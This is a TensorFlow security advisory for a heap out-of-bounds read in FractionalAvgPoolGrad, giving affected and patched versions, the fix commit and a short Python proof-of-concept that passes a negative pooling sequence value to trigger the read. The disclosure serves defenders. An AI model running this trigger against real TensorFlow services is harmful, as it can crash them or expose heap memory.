# Heap OOB access in `FractionalAvgPoolGrad`

Moderate

[mihaimaruseac](/mihaimaruseac)
published
GHSA-vjg4-v33c-ggc4
Feb 2, 2022

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.8.0

## Patched versions

2.5.3, 2.6.3, 2.7.1

## Description

### Impact

The [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:

```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.FractionalAvgPoolGrad(
    orig_input_tensor_shape=[2,2,2,2],
    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],
    row_pooling_sequence=[-10,1,2,3],
    col_pooling_sequence=[1,2,3,4],
    overlapping=True)
  return y

test()
```
### Patches

We have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.

### Severity
